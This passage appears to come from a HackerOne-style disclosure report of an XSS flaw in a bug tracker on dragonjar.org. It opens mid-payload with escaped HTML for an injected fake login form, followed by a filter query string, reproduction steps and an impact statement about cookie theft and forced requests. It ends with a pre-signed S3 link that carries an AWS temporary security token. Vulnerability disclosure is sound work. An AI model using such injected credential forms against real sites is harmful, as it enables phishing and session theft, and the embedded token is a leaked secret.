o de sesión\u003c/h4\u003e\u003cdiv class=\"space-10\"\u003e\u003c/div\u003e\u003cform id=\"login-form\" method=\"post\" action=\"https://www.dragonjar.org\"\u003e\u003cfieldset\u003e\u003clabel for=\"username\" class=\"block clearfix\"\u003e\u003cspan class=\"block input-icon input-icon-right\"\u003e\u003cinput id=\"username\" name=\"username\" type=\"text\" placeholder=\"Nombre de usuario\"   size=\"32\" maxlength=\"191\" value=\"\"   class=\"form-control autofocus\"\u003e\u003ci class=\"ace-icon fa fa-user\"\u003e\u003c/i\u003e\u003c/span\u003e\u003c/label\u003e\u003clabel for=\"password\" class=\"block clearfix\"\u003e\u003cspan class=\"block input-icon input-icon-right\"\u003e\u003cinput id=\"password\" name=\"password\" type=\"password\" placeholder=\"Contraseña\" size=\"32\" maxlength=\"1024\" class=\"form-control autofocus\"\u003e\u003ci class=\"ace-icon fa fa-lock\"\u003e\u003c/i\u003e\u003c/span\u003e\u003c/label\u003e\u003cdiv class=\"space-10\"\u003e\u003c/div\u003e\u003cinput type=\"submit\" class=\"width-40 pull-right btn btn-success btn-inverse bigger-110\" value=\"Iniciar sesión\" /\u003e\u003c/fieldset\u003e\u003c/form\u003e\u003c/div\u003e\u003c!--\u0026dir[]=ASC\u0026end_day=15\u0026end_month=2\u0026end_year=2020\u0026filter=Use%20Filter\u0026filter_by_date=0\u0026filter_by_last_updated_date=0\u0026handler_id[]=0\u0026hide_status[]=-2\u0026highlight_changed=6\u0026last_updated_end_day=15\u0026last_updated_end_month=2\u0026last_updated_end_year=2020\u0026last_updated_start_day=15\u0026last_updated_start_month=2\u0026last_updated_start_year=2020\u0026match_type=0\u0026monitor_user_id[]=0\u0026note_user_id[]=0\u0026os[]=0\u0026os_build[]=0\u0026per_page=50\u0026platform[]=0\u0026priority[]=0\u0026profile_id[]=0\u0026relationship_bug=0\u0026relationship_type=-1\u0026reporter_id[]=0\u0026resolution[]=0\u0026search=the\u0026severity[]=0\u0026sort[]=priority\u0026start_day=15\u0026start_month=2\u0026start_year=2020\u0026status[]=10\u0026sticky=0\u0026tag_select=0\u0026tag_string=17\u0026type=1\u0026view_state=0\u0026view_type=simple\n```\n\n\n## Steps needed to reproduce bug:\n\n1. Open PoC.html ( {F876154} ) file in a web browser\n2. check the webform\n\n## Impact\n\nAn attacker could create a payload that, when visiting the site, without doing anything else (the site has a lot of traffic), could perform sensitive actions, such as reading private information, obtaining cookies those that are not marked as \"httpOnly\" or \" isSecure \", including creating or modifying information within the platform since it does not have anti CSRF protection and we can force victims to generate requests on their behalf in the system with their privileges.","weakness":{"id":112,"name":"Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":876154,"file_name":"PoC.htm","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xZMMsr3tAwBPK67y6Ff7QJ2x?response-content-disposition=attachment%3B%20filename%3D%22PoC.htm%22%3B%20filename%2A%3DUTF-8%27%27PoC.htm\u0026response-content-type=application%2Foctet-stream\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQGZ6LTSB%2F20260429%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20260429T084712Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjECgaCXVzLXdlc3QtMiJHMEUCIQC7mqe46kPhJeVkT%2BfOYRKXUga5A2lKJha3jedcj2dbrAIgZYk%2BllrT%2FPgvgfWFGwYZfTQUiZvbn1zWZRAPbx5dFQgquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDIxgP0T6EsSYlHCEAiqPBWnwK3BpWWlBO5SUOYmGLWgtu5CiVqHv04NUQStRYf9idDNWhyUG%2Br1B%2BXVsgn1%2B8meqMDKS0i86vF3ZvHhx8KEghsYuiuTmF2JZQCdzbiaevkFLTyyBT0LlTa2u%2BDzTOoOAIcQ4IO1XRf37kKvkDeZXTp0%2B999jyfZJ38pjnbr4pYpErtV2mBpGeH4plXxxXT2EyIsZjeGYwQXBt5WBgBmJxzDMqWMayu4EUbV75x3b0Jr7f1EyBZgz%2FgFz%2B1C8F7RFxjIhYiIQEe6bDKEz6GzIJNvyhX4jMF9ntXu09d9RVyoMezSLolZ5MpFpHs0OeokGjXaWd18iiXmz4jzLtj0Dt9Vu0T5sC20m1AAWZiGo1D